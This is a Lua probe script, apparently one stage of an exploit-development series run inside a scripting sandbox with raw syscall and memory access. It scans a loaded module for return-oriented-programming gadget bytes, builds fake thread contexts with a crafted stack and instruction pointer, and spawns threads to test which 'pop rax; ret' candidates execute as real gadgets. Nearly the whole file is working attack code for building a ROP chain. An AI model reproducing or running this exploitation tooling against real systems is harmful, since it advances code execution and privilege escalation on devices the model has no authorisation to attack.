-- CRASH_CLASS: MODERATE
-- PROBE 405a: which `pop rax; ret` candidates are real instructions
--
-- 404a's child faulted (the loader dumped a record with magic 0x13371337 and the stack
-- words we armed) but the PROCESS survived and kept answering - so a faulting child is
-- survivable, which makes gadget testing cheap.
--
-- A byte scan can find `58 C3` inside a longer instruction. This tests each of the six
-- candidates by execution:
--   child RIP = candidate
--   stack    = [MARKER][write gadget `mov [rdi],rax; ret`][park]
--   RDI      = a marker page
-- If the candidate is a real `pop rax; ret`, RAX becomes MARKER and the write gadget
-- stores it into the page. The page is read after a short wait and reported.
-- Children are never killed.

print("=== PROBE 405a: GADGET VERIFY ===")

local MARKER = 0x0BADF00DCAFE1234

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end
local function u64v(v) return u64(math.floor(v / 4294967296), v % 4294967296) end
local function rq(addr)
    local t = memory.read_qword(addr)
    if type(t) == "table" then return (to_num(t.h) * 4294967296) + to_num(t.l or 0) end
    return to_num(t)
end

local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
pcall(function() memory.write_dword(info, 0x160) end)
local rv = -999
pcall(function() rv = sgn(sc_info(uint64(0), uint64(info), uint64(0), uint64(0), uint64(0), uint64(0))) end)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
local size = to_num(memory.read_dword(info + 0x110))
print(string.format("[A] base=0x%X size=0x%X", base, size))
if base <= 0 or size <= 0 then print("=== 405a DONE ===") return end
if size > 0x600000 then size = 0x600000 end

local buf
do
    local ok, b = pcall(function() return memory.read_buffer(base, size) end)
    if not ok or type(b) ~= "string" then print("[A] read failed") print("=== 405a DONE ===") return end
    buf = b
end
print(string.format("[A] read %d bytes", #buf))

local function find_all(pat, limit)
    local out = {}
    local pos = 1
    while #out < limit do
        local s = buf:find(pat, pos, true)
        if not s then break end
        out[#out + 1] = base + s - 1
        pos = s + 1
    end
    return out
end

local parks = find_all("\235\254", 1)
local writes = find_all("\72\137\7\195", 1)   -- 48 89 07 C3  mov [rdi],rax; ret
local pops = find_all("\88\195", 6)
print(string.format("[B] park=%s write=%s pops=%d",
    tostring(parks[1]), tostring(writes[1]), #pops))
if not parks[1] or not writes[1] or #pops == 0 then print("=== 405a DONE ===") return end

local park, write_g = parks[1], writes[1]

local sc_mmap = make_syscall(477)
local function map(len)
    local a = 0
    pcall(function() a = sgn(sc_mmap(uint64(0), uint64(len), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))) end)
    return a
end

local sc_thr = make_syscall(430)
local function test_candidate(cand, idx)
    local marker = map(0x4000)
    local stack = map(0x8000)
    if marker <= 0 or stack <= 0 then return "no memory" end
    pcall(function() memory.write_qword(marker, u64(0, 0)) end)

    local rsp = stack + 0x4000
    memory.write_qword(rsp, u64v(MARKER))
    memory.write_qword(rsp + 8, u64v(write_g))
    memory.write_qword(rsp + 16, u64v(park))

    local ctx = memory.alloc(0x500)
    local k = 0
    while k < 0x500 do
        pcall(function() memory.write_dword(ctx + k, 0) end)
        k = k + 4
    end
    memory.write_qword(ctx + 0x108, u64(0, 0x480))
    memory.write_qword(ctx + 0x110, u64(0, 0x10000))
    memory.write_qword(ctx + 0x0c0, u64(0, 0x43))
    memory.write_qword(ctx + 0x0e0, u64v(cand))
    memory.write_qword(ctx + 0x0f0, u64(0, 0x202))
    memory.write_qword(ctx + 0x0f8, u64v(rsp))
    memory.write_qword(ctx + 0x100, u64(0, 0x3b))
    memory.write_qword(ctx + 0x048, u64v(marker))

    local out = memory.alloc(0x20)
    memory.write_qword(out, u64(0, 0))
    local trv = -999
    pcall(function() trv = sgn(sc_thr(uint64(ctx), uint64(out), uint64(0))) end)

    local t = 0
    while t < 300000 do t = t + 1 end
    local got = rq(marker)
    return string.format("create=%d got=0x%X %s", trv, got,
        (got == MARKER and "REAL" or "no"))
end

for i = 1, #pops do
    local res = test_candidate(pops[i], i)
    print(string.format("[C%d] 0x%X %s", i, pops[i], res))
end

print("=== 405a DONE ===")
